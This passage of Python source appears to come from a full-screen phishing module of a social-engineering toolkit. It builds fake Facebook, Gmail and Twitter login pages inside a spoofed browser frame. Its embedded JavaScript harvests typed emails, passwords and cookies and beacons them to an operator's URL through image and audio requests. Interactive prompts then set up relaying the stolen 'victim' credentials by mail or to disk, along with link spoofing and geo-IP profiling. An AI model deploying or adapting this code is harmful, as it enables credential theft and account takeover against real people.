if (strtolower($saveType) === "db"){  obfuscatePageError(); }
elseif(strtolower($saveType) === "disk"){ diskAdd($infoPayload,$fileName); obfuscatePageError(); }
elseif(strtolower($saveType) === "both"){  obfuscatePageError(); }
else{ obfuscatePageError(); }
?>
        """

        r.append(self.inputData)
        # return code
        return r

    ################################################
    ################################################


    def XSSGenCodeCSS(self,storageDict,cssType):
    # This Generates the XSS Facebook CSS File Code
 

        # Facebook Custom XSS CSS File
        if cssType == "FB":

            j = []
            # create XSS Facebook CSS for html payload
            self.inputData = """
html.fullscreened {
  overflow-y: hidden;
  background-color: #fff;
}

.fullscreened #container { display: none; }

#textBox {

     /* Updated in JS */
       position:absolute;
       left:400px;
       top:100px;
		
   }		
#textBoxTwo {
     /* Updated in JS */
       position:absolute;
       left:400px;
       top:130px;
			

   }
	
#buttonSubmit {
      /* Updated in JS 420 */
       position:absolute;
       left:450px;
       top:180px;
	
	
   }		

#spoofSite {
  background-color: #fff;
  left: 0;
  margin: 0 auto;
  overflow-y: scroll;
  position: fixed;
  width: 100%;
  z-index: 2;

  /* Updated in JS */
  top: 100px;
  height: 500px;
}
.not-fullscreened #spoofSite { display: none; }


#spoofHeader {
  position: fixed;
  top: 0;
  left: 0;  
  width: 100%;
  z-index: 2;
}
.not-fullscreened #spoofHeader { display: none; }

#spoofMenu, #spoofBrowser { width: 100%; }


/* Menu (OS X only) */

.osx #spoofMenu { height: 22px; }
.windows #spoofMenu, .linux #spoofMenu { height: 0; }

.chrome.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-chrome-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

.firefox.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-firefox-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

.safari.osx #spoofMenu {
  background: url(""" + storageDict + """menu-osx-safari-left.png) left top no-repeat, url(""" + storageDict + """menu-osx-right.png) right top no-repeat, url(""" + storageDict + """menu-osx-bg.png) left top repeat-x;
}

/* Browser UI */

.chrome.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-chrome-bg.png) left top repeat-x;
  height: 72px;
}

.chrome.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-chrome-bg.png) left top repeat-x;
  height: 61px;
}

.chrome.linux #spoofBrowser {
  background: url(""" + storageDict + """browser-linux-chrome-left.png) left top no-repeat, url(""" + storageDict + """browser-linux-chrome-right.png) right top no-repeat, url(""" + storageDict + """browser-linux-chrome-bg.png) left top repeat-x;
  height: 86px;
}

.firefox.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-firefox-center.png) center top no-repeat, url(""" + storageDict + """browser-osx-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-firefox-bg.png) left top repeat-x;
  height: 87px;
}

.firefox.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-firefox-bg.png) left top repeat-x;
  height: 63px;
}

.firefox.linux #spoofBrowser {
  background: url(""" + storageDict + """browser-linux-firefox-left.png) left top no-repeat, url(""" + storageDict + """browser-linux-firefox-right.png) right top no-repeat, url(""" + storageDict + """browser-linux-firefox-bg.png) left top repeat-x;
  height: 90px;
}

.safari.osx #spoofBrowser {
  background: url(""" + storageDict + """browser-osx-safari-center.png) center top no-repeat, url(""" + storageDict + """browser-osx-safari-left.png) left top no-repeat, url(""" + storageDict + """browser-osx-safari-right.png) right top no-repeat, url(""" + storageDict + """browser-osx-safari-bg.png) left top repeat-x;
  height: 72px;
}

.safari.windows #spoofBrowser {
  background: url(""" + storageDict + """browser-windows-safari-center.png) center top no-repeat, url(""" + storageDict + """browser-windows-safari-left.png) left top no-repeat, url(""" + storageDict + """browser-windows-safari-right.png) right top no-repeat, url(""" + storageDict + """browser-windows-safari-bg.png) left top repeat-x;
  height: 72px;
}
            """
            # return XSS CSS for writing
            j.append(self.inputData)
            return j

    #######################################################
    #######################################################

    def XSSGenCode(self,storageList,typeOf = "MIX"):
    #XSS Generator Facebook JavaScript Header
        
        #@BELOW ARE ALL RELAY XSS COMMUNICATIONS
        #@CURRENTLY MIXED METHODS ARE ONLY SUPPORTED 
        #@LAYOUT: FUNCTIONS >> SUBMIT_FUNCTION >> HTML_FULLSCREEN_PAYLOAD
        if typeOf == "MIX":
            d = []
            # Mix Send Info Options Body
            mixMethodsOption = """



function imgURLPass(dataPayload){
   
   var img = new Image();
   img.src="%(url)s"+encodeURIComponent(dataPayload);
   img.onload = function(){
       return true;
    }

 }

function redirectUser(urlRedirect){
    window.location(urlRedirect);
 }

function imgHTMLEmbed(dataPayload,urlPayload){

    // create payload
    var fullPayload = "%(url)s"+encodeURIComponent(dataPayload);
    var htmlEmbed = '<img src=\\''+fullPayload+'\\' width=\\'1\\' height=\\'1\\' onload=\\'redirectUser(\\''+urlPayload+'\\');\\' onerror=\\'imgHTMLEmbed(\\''+dataPayload+'\\');\\'>';
    document.write(htmlEmbed);

 }
 

function audioMacPass(dataPayload){

    var valuePayload = "%(url)s"+encodeURIComponent(dataPayload);
    var audioMacPayload = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab" height="16" width="250">\\n'+
'<param name="src" value="'+valuePayload+'">\\n'+
'<param name="autoplay" value="true">\\n'+
'<param name="controller" value="true">\\n'+
'<embed height="16" width="250" src="'+valuePayload+'" pluginspage="http://www.apple.com/quicktime/download/" type="video/quicktime" controller="true" autoplay="true">\\n'
'</object>';

    document.write(audioMacPayload);

 }


function audioPass(dataPayload){

    // Create URL payload handoff data
    var fullPayload = "%(url)s"+encodeURIComponent(dataPayload);
    var audioPayload = '<audio autoplay="autoplay">\\n'+
'<source src="'+fullPayload+'" type="audio/mpeg">\\n'+
'<source src="'+fullPayload+'" type="audio/ogg">\\n'+
'<!--[if lt IE 9]>\\n'+
'<bgsound src="'+fullPayload+'" loop="1">\\n'+
'<![endif]-->\\n'+
'</audio>';

    document.write(audioPayload);

 }



function jamSubmit(){

   // User
   var user = document.getElementById('Email').value;
   // Pass
   var password = document.getElementById('Password').value;
   // Type of Account
   var type = "%(accountType)s";
   // append false flag-
   var t = false;
   // Grab Current Sites Cookies Also
   var myCookies = document.cookie;
   // Append all data for sending
   var dataPayload = "U: " + user + " P: " + password + " T: " + type + " Cookies: " + myCookies;
   // redirect to this url for user login
   var windowRedirectURL = "%(redirect)s"+user;  
   // Pass Data
   t = imgURLPass(dataPayload);
   // loop till we pass it
   while (t === false){
       // Loop until returns false 
       t = imgURLPass(dataPayload); 
    }
    // Pass Data with embed img attribute
    imgHTMLEmbed(dataPayload,windowRedirectURL);
    // Browser detect display certain audio attributes
    if (BrowserDetect.browser == "Chrome") {
          audioPass(dataPayload);
    } else if (BrowserDetect.browser == "Firefox") {
            audioPass(dataPayload);
    } else if (BrowserDetect.browser == "Safari") {
           audioMacPass(dataPayload);
    } else {
            audioPass(dataPayload);
    }
    // Redirect to actual login page
    window.location = "%(redirect)s"+user;  

}

function displayGold(){

goat = 
'<!doctype html>' +
'<html class="no-js" lang="en">' +
'<head>' +
'<meta charset="utf-8">' +
'<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">' +
'<title>%(spoofWebTitle)s</title>' +
'<meta name="description" content="">' +
'<link rel="stylesheet" href="%(spoofWebStyleSheet)s">' +
'<script src="%(spoofWebJS1)s"></script> ' +
'<script src="%(spoofWebJS2)s"></script>' +
'<script src="%(spoofWebJS3)s"></script>' +
'<script src="%(spoofWebJS4)s"></script>' +
'<script src="%(spoofWebJS5)s"></script>' +
'</head>' +
'<body>' +
'<a class="spoofLink" href="%(spoofWebURL)s">%(spoofWebURLCaption)s</a>' +
'<div id="spoofHeader">' +
'<div id="spoofMenu"></div>' +
'<div id="spoofBrowser"></div>' +
'</div>' +
'<div id="spoofSite">' +
'<table border="0" id="loginss">'+
'<div id="textBox"> <B><font size="1">Email: &emsp;&emsp;<input type="text" name="Username"></div>'+
'<div id="textBoxTwo"><B> Password: <input type="password" name="Password"></div>'+
'<div id="buttonSubmit"><input type="submit" value="Login"  onclick="jamSubmit();"></div>'+
'</table>'+
'<center><img src="%(imgDirXSS)s">'+
'</div>\\n'+
'</body>\\n'+
'</html>';

    document.write(goat);

   }

    displayGold();
            """ % (storageList)

            # return for writing and usage
            d.append(mixMethodsOption)
            return d


   ################################################################################
   ################################################################################
 
    def returnCorrectPath(self,SETPath,osName = "posix"):
    # Tries to Return the Absolute Correct Root Path of where the SET folder resides

        # Init List
        pathList = []

        if osName == "posix":
            # Split at correct path dividers
            pathList = SETPath.split("/")
            self.pathDivider = "/"
        elif osName == "windows":
            # Split at correct path window dividers
            pathList = SETPath.split("\\")
            self.pathDivider = "\\"
        else:
            # Shouldnt Hit this but lets search for the divider then
            d = SETPath.find("\\")       
            if d == -1:
                d = SETPath.find("/")                  
                if d == -1:
                    return "NONE"
                else:
                    pathList = SETPath.split("/")
                    self.pathDivider = "/"
            else:
                pathList = SETPath.split("\\")
                self.pathDivider = "\\"

        # Set up While Loop and Find Path
        # By Subtracting and taking
        self.countDracula = len(pathList)
        while True:
            # decrement countDracula for loop killing
            self.countDracula = self.countDracula - 1
            # Infinite Loop Killer
            if self.countDracula == 0:
                # Terminate Loop Return NONE
                return "NONE"
            # Take last directory out of list and check
            pathList.pop()
            # Join them back together in a new variable
            self.pathCheck = self.pathDivider.join(pathList)
            # Create absolute path if this path does work
            self.absolutePath = self.pathCheck
            # Add Test Directory thats always in SETS Root Directory
            self.pathCheck =  self.pathCheck + "/src"
            # Now lets test and see if Directory is there
            if os.path.isdir(self.pathCheck):
                # Terminate Loop Lets Return the Absolute Path of SET :D Hugs
                return self.absolutePath
            else:
                pass
            

   ################################################################################
   ################################################################################

    def deployFullPhish(self,AttackType):
    # This Asks Questions And Sets up the Generated FullScreen Attack Files For Deployment or Alteration """

        # SERVER OR DIRECTORY
        serverList = []
        # mail or disk selection 
        storageList = []
        # asks all other questions title of page , intel verbose etc.etc.
        otherList = []
        # Stores end results if files were written returns True
        createGarbage = []

        # Add 0 AttackType to list
        storageList.append(AttackType)

        # Check if PHP is enabled they need it soooWEE 
        storageList.append(self.phpEnabled())
  

        self.results = raw_input("\nDo you have a Local Server Setup? (y Or n): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            self.results = raw_input("\nSpecify Full Path to Web Server Folder (ex: /var/www/html ): ")     
            resultss = self.results 
            if os.path.isdir(self.results):
                # Specify which action to take also
                serverList.append("ACTION:WEB_SERVER_PATH")
                # Append Directory to create files to
                serverList.append(resultss)
            else:
                self.results = raw_input("\nDir Not Found, Specify Main Web Folder Directory (ex: /var/www ): ")      
                resultss = self.results 
                if os.path.isdir(self.results):
                    # Specify which action to take also
                    serverList.append("ACTION:WEB_SERVER_PATH")
                    # Append Directory to create files to
                    serverList.append(resultss)
                else:
                    # Didnt say yes or no about FTP Files
                    self.errorOutput("[!] Error - We Couldn't Find That Web Directory.","yellow")  
        else:
            self.results = raw_input("\nSpecify a Dir path to Load the files to (ex: /home/d/set/attacks ): ")     
            resultss = self.results 
            if os.path.isdir(self.results):
                # Append WebServer Path
                # Specify which action to take also
                serverList.append("ACTION:DIR_PATH")
                # Append Directory to create files to
                serverList.append(resultss)
            else:
                self.results = raw_input("\nDirectory not found wanna try to create it? (y Or n): ")   
                if self.results.lower() == "y" or self.results.lower() == "yes":  
                    # Create JS Directory 
                    try:
                        os.makedirs(resultss)
                    except:
                        pass
                    if os.path.isdir(resultss):
                        #Specify which action to take also
                        serverList.append("ACTION:DIR_PATH")
                        # Append Directory to create files to
                        serverList.append(resultss)
                    else:
                        self.errorOutput("[!] Error - Couldn't Create the Directory Sorry Check Permissions","yellow")     
                else:
                    # nothing left to do
                    self.errorOutput("[!] Error - There isn't anything else we can do right now sorry.","yellow")   

        # Get Relay Information Disk or Mail Return / Pass php enabled 													
	    # Mail or Disk ask user
        phpEnabled = "YES"
        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
        if self.results.lower()[0] == "m" or self.results.lower() == "mail":
            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","red")
            storageList.append("MAIL")
            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
            if self.results.split("@") and len(self.results) > 5:
                storageList.append(self.results)
            else:
                # Throw Error improper email no @
                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
        elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
            # We need PHP to store the file on server
            if phpEnabled == "NO_PHP":
                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
            else:
                storageList.append("DISK")
                # Ask if they want a Random File name created
                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                    storageList.append("RANDOM_FILE")
                else:
                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                    # Check if string is AlphaNumerical
                    if  self.checkString(self.results) == False:
                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
                    else:
                        storageList.append(self.results)
        else:
            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")



       # Check if they just want to output directory   
       # Check about Directory Creating Append the Serverlist for FTP Checking to
       # Display Proper Error Message for the user
       # storageList.append(self.createDirectoryFullScreen(serverList))
      
       # All Other Checks
       # Create Intel explain menu
        menuDisplay = """
        \n
        [*] Information Verbose:
            Ontop of Asking for the Username and 
            Password Should we Gather Even
            More Information about the User such as 
            GEOIP / ISP / User Agent etc. etc. 
            This Requires Curl to be installed or 
            file_get_contents in PHP on selected Server   
        """
        # display About this
        self.outputText(menuDisplay,"cyan")
        # Set Verbose of Intel Gather
        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            otherList.append("INTEL_VERBOSE_LOUD")
        elif self.results.lower()[0] == "n" or self.results.lower() == "no":
            otherList.append("INTEL_VERBOSE_HUSH")
        else:
            # Anything Else lets just Hush it then
            otherList.append("INTEL_VERBOSE_HUSH")
        # Redirect Ask
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = Redirect URL Which is the Same 
         = URL of the Full-Screen Attack 
         = you picked. For Instance If 
         = it was AOL Full-Screen Attack
         = the default URL redirect would 
         = be https://my.screenname.aol.com
        """
        # display About this
        self.outputText(menuDisplay,"green")
        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("REDIRECT_DEFAULT")
        else:
            # No Checking on URL Let Them Use Whatever lol there bad i guess
            # Append Default Redirect Naaaow
            otherList.append(self.results)  


        # Spoof link
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the URL Link to be spoofed
         = to? This will be displayed when the user
         = rolls over the link. Basically tricking
         = them making them think they are going
         = to that URL..
        """
        # display About this
        self.outputText(menuDisplay,"darkyellow")
        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("DEFAULT_SPOOF")
        else:
            # Append specified spoof url now
            otherList.append(self.results)

        # link name
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the Actual URL name
         = to be?
        """
        # display About this
        self.outputText(menuDisplay,"red")
        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("DEFAULT_URL_NAME")
        else:
            # Append url name
            otherList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =    name of Index.php If you feel 
        =    the need to change the name please 
        =    do not add the actual extension .php 
        =    along with it only add whatever crazy 
        =    name you come up with
        """
        # display About this
        self.outputText(menuDisplay,"blue")
        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("INDEX_DEFAULT")
        else:
            check = self.results.find(".")
            # if it doesn't return a -1 it found a decimal
            if check != -1:
                # Throw Error we found a dot
                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
            else:
                # Append name of the File
                otherList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =       Title of the Webpage. 
        """
        # display About this
        self.outputText(menuDisplay,"cyan")
        self.results = raw_input("What Should the Title of the Page be? (ex: Twitter Login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            otherList.append("TITLE_DEFAULT")
        else:
            # Append name of the File
            otherList.append(self.results)


        # Pass Apended List lets Create files
        #createGarbage = self.createPhishFoodFullScreen(storageList,serverList,otherList)

        fileError = []
	# Lets Create the files 
        if storageList[0] == "FB" or storageList[0] == "TWITTER" or storageList[0] == "AOL" or storageList[0] == "GMAIL" or storageList[0] == "OUTLOOK":
            # Pass Options Create Output Files in Specified WebServer Folder
            fileError = self.createFullScreenFile(storageList,serverList,otherList)

        # Check if it was a success
        if fileError == True:
            self.outputText("\n[*] Creation of Files was a Success.. Lets do this... :D \n","darkyellow")
            self.errorOutput("[*] Returning to FullScreen Menu to go back to Main just Press 99 \n","yellow")
            self.errorOutput("","white")
        else:
            self.errorOutput("[*] Error - Something Went Wrong Try Again BraH...","yellow")
        
   ################################################################################
   ################################################################################

    def otherOptionsFullScreen(self):
        """  Other Options Asked before Full-Screen Attack Files are
             Created and Deployed in the field
        """  
       
        # Set Storage List
        storageList = []
        # Create Intel explain menu
        menuDisplay = """
        \n
        [*] Information Verbose:
            Ontop of Asking for the Username and 
            Password Should we Gather Even
            More Information about the User such as 
            GEOIP / ISP / User Agent etc. etc. 
            This Requires Curl to be installed or 
            file_get_contents in PHP on selected Server   
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        # Set Verbose of Intel Gather
        self.results = raw_input("\nWould you like to Build a More In-depth Intel Report on Victim ( y Or n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            storageList.append("INTEL_VERBOSE_LOUD")
        elif self.results.lower()[0] == "n" or self.results.lower() == "no":
            storageList.append("INTEL_VERBOSE_HUSH")
        else:
            # Anything Else lets just Hush it then
            storageList.append("INTEL_VERBOSE_HUSH")
        # Redirect Ask
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = Redirect URL Which is the Same 
         = URL of the Full-Screen Attack 
         = you picked. For Instance If 
         = it was AOL Full-Screen Attack
         = the default URL redirect would 
         = be https://my.screenname.aol.com
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("After the Victim Inputs Info Where Should the Script Redirect?: ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("REDIRECT_DEFAULT")
        else:
            # No Checking on URL Let Them Use Whatever lol there bad i guess
            # Append Default Redirect Naaaow
            storageList.append(self.results)  


        # Spoof link
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the URL Link to be spoofed
         = to? This will be displayed when the user
         = rolls over the link. Basically tricking
         = them making them think they are going
         = to that URL..
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What should the URL be spoofed to? (ex: https://my.screenname.aol.com): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("DEFAULT_SPOOF")
        else:
            # Append specified spoof url now
            storageList.append(self.results)

        # link name
        menuDisplay = """
        \n
      [*]   Hitting Enter Keeps the Default 
         = What do you want the Actual URL name
         = to be?
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What should the URL name be? (ex: Aol Login): ")
        # Check if nothing was entered      
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("DEFAULT_URL_NAME")
        else:
            # Append url name
            storageList.append(self.results)

        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =    name of Index.php If you feel 
        =    the need to change the name please 
        =    do not add the actual extension .php 
        =    along with it only add whatever crazy 
        =    name you come up with
        """
        # display About this
        self.outputText(menuDisplay,"yellow")
        self.results = raw_input("What Should the Main Index PHP File Be Called? ( ex: login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("INDEX_DEFAULT")
        else:
            check = self.results.find(".")
            # if it doesn't return a -1 it found a decimal
            if check != -1:
                # Throw Error we found a dot
                self.errorOutput("[*] Error - Didn't We Say Not to Add an Extension, WOW...","yellow")
            else:
                # Append name of the File
                storageList.append(self.results)



        menuDisplay = """
        \n
        [*]    Hitting Enter Keeps the Default 
        =       Title of the Webpage.
        """
        # display About this
        self.outputText(menuDisplay,"blue")
        self.results = raw_input("What Should the Title of the Page be? (ex: AOL Login ) : ")
        if self.results == "" or self.results == " ":
            # Append Default Redirect Naaaow
            storageList.append("TITLE_DEFAULT")
        else:
            # Append name of the File
            storageList.append(self.results)


        # Return Storage List for Processing
        return storageList

   ################################################################################
   ################################################################################

    def copyJunk(self,src, dst):
    # Copy Directory to New Directory

        try:
            shutil.copytree(src, dst)
        except OSError as exc: 
            if exc.errno == errno.ENOTDIR:
                shutil.copy(src, dst)
            else:
                return "COPY"


   ################################################################################
   ################################################################################

    def createFullScreenFile(self,optionList,serverList,otherList):

        if serverList[0] == "ACTION:WEB_SERVER_PATH":

            if optionList[0] == "GMAIL":
                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified WebServer Path...\n","darkgreen")
            elif optionList[0] == "FB":
                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified WebServer Path...\n","darkgreen")
            elif optionList[0] == "TWITTER":
                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified WebServer Path...\n","darkgreen")
        else:

            if optionList[0] == "GMAIL":
                self.outputText("\n[*] Creating GMAIL FullScreen Files in Specified Directory Path...\n","green")
            elif optionList[0] == "FB":
                self.outputText("\n[*] Creating Facebook FullScreen Files in Specified Directory Path...\n","darkgreen")
            elif optionList[0] == "TWITTER":
                self.outputText("\n[*] Creating Twitter FullScreen Files in Specified Directory Path...\n","darkgreen")


        # GRAB Path Divider used by operating system
        self.pathDivider = self.returnPathDivider(os.getcwd())

        self.outputText("\n[*] Attempting to Create Directory + Moving Images there....\n","darkgreen")


        if optionList[0] == "FB":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "img"
        elif optionList[0] == "GMAIL":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "img"
        elif optionList[0] == "TWITTER":
            imageFileDirectory = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "img"


        newImgDirectory = serverList[1] + self.pathDivider + "img"

        if self.copyJunk(imageFileDirectory,newImgDirectory) == "COPY":
        #if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to move JS Files and create JS Directory.......\n","red")
        if optionList[0] == "FB":
            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "js"        
        elif optionList[0] == "GMAIL":
            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "js"
        elif optionList[0] == "TWITTER":
            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "js"

        newJSDirectory = serverList[1] + self.pathDivider + "js"
        # Move Files now
        err = self.copyJunk(jsCompletePath,newJSDirectory)
        if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to move CSS Files.......\n","red")
        if optionList[0] == "FB":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "css"        
        elif optionList[0] == "GMAIL":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "css"
        elif optionList[0] == "TWITTER":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "css"   

        newCSSDirectory = serverList[1] + self.pathDivider + "css"
        # Move Files now
        err = self.copyJunk(cssCompletePath,newCSSDirectory)
        if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to Create The PHP Code Now.......\n","red")

        indexList = []
        # Disk or Mail default is disk if there is an error somehow
        if optionList[2] == "MAIL":
            indexList.append("mail")
        elif optionList[2] == "DISK":
            if optionList[3] == "RANDOM_FILE":
                indexList.append("diskRandom")
            else:
                indexList.append("diskFile")
        else:
            indexList.append("diskFile")

        # Redirect Check and do
        if otherList[1] == "REDIRECT_DEFAULT":
            if optionList[0] == "GMAIL":
                indexList.append("https://accounts.google.com/ServiceLoginAuth")
            elif optionList[0] == "FB":
                indexList.append("https://www.facebook.com/login.php?login_attempt=1")  
            elif optionList[0] == "TWITTER":
                indexList.append("https://twitter.com/login/error?redirect_after_login=%2F&username_or_email=")  
        else:
            indexList.append(otherList[1])

        # intel Verbose check now loud or quiet 
        if otherList[0] == "INTEL_VERBOSE_LOUD":
            indexList.append("loud")
        elif otherList[0] == "INTEL_VERBOSE_HUSH":
            indexList.append("quiet")
        else:
            indexList.append("quiet")

        # Append file name or email being sent too
        if optionList[2] == "MAIL":
            indexList.append(optionList[3])
        elif optionList[2] == "DISK" and optionList[3] != "RANDOM_FILE":
            indexList.append(optionList[3])
        else:
            # Random file has been picked we dont need a name
            indexList.append("POOP")
        

        # Put together the final list to create the index file
        indexFBList = []
        if otherList[2] == "DEFAULT_SPOOF":
          if optionList[0] == "GMAIL":
                indexFBList.append("https://www.gmail.com")
          elif optionList[0] == "FB":
                indexFBList.append("https://www.facebook.com")  
          elif optionList[0] == "TWITTER":
                indexFBList.append("https://www.twitter.com")  
        else:
           indexFBList.append(optionList[2])


        if otherList[3] == "DEFAULT_URL_NAME":
          if optionList[0] == "GMAIL":
                indexFBList.append("Gmail Login")
          elif optionList[0] == "FB":
                indexFBList.append("Facebook Login")  
          elif optionList[0] == "TWITTER":
                indexFBList.append("Twitter Login")  
        else:
           indexFBList.append(otherList[3])

        if otherList[5] == "TITLE_DEFAULT":
            if optionList[0] == "GMAIL":
                title = "Gmail: Email From Google"
            elif optionList[0] == "FB":
                title = "Welcome to Facebook - Log In, Sign Up or Learn More"
            elif optionList[0] == "TWITTER":
                title = "Sign in to Twitter"

        else:
            title = otherList[5]

        # image body 
        indexFBList.append("img/facebook/fb.png")
        # JS Files now
        indexFBList.append("js/libs/jquery-1.7.2.js")
        indexFBList.append("js/libs/browser-detect.js")
        indexFBList.append("js/libs/fullscreen-api-shim.js")
        indexFBList.append("js/libs/jquery-ui-1.8.18.custom.min.js")
        indexFBList.append("js/script.js")


        fbCode = []
        # Decide what code we need
        if optionList[0] == "FB":
            # Facebook html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"FB"))      
        elif optionList[0] == "GMAIL":
            # Gmail html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"GMAIL"))      
        elif optionList[0] == "TWITTER":
            # Gmail html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"TWITTER"))          

        # save as index.php  no path divider this should always be / for localhost or specified host
        if otherList[4] == "INDEX_DEFAULT":
            errCheck = self.saveFile(serverList[1] + "/index.php",fbCode,"text")
            if errCheck == "ERR_FILE_OPEN":
                self.errorOutput("[!] Error - Couldn't Create [index.php] File Check Folder Permissions","yellow")
                return False
        # Save as whatever the user has picked
        else:
            errCheck = self.saveFile(serverList[1] + "/" + otherList[4],fbCode,"text")
            if errCheck == "ERR_FILE_OPEN":
                self.errorOutput("[!] Error - Couldn't Create [\""+otherList[4]+"\"] File Check Folder Permissions","yellow")
                return False
        
        # Check if the path of the file is there and created
        if os.path.exists(serverList[1]+"/"+otherList[4]) or os.path.exists(serverList[1]+ "/index.php"):
            # Success on writing it seeems
            return True
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						
        else: return False
  
   ################################################################################
   ################################################################################

    def outputText(self,text,color):
    # this actually outputs text plus whatever color nothing fancy

        # Obviously a POSIX System grab color
        if self.determineOperatingSystem() != "windows":

            # decide the fate of what color we shall use to output
            if color == "white":
                color = '\033[37m'
            elif color == "red":
                color = '\033[31m'
            elif color == "cyan":
                color = '\033[36m'
            elif color == "blue":
                color = '\033[34m'
            elif color == "magenta":
                color = '\033[35m'
            elif color == "darkyellow":
                color = '\033[33m'
            elif color == "yellow":
                color = '\033[93m'
            elif color == "darkgreen":
                color = '\033[32m'
            elif color == "green":
                color = '\033[92m'
            elif color == "black":
                color = '\033[30m'
 
        # Windows lol :P
        elif self.determineOperatingSystem() == "windows":

            if color == "white":
                color = ''
            elif color == "red":
                color = ''
            elif color == "cyan":
                color = ''
            elif color == "blue":
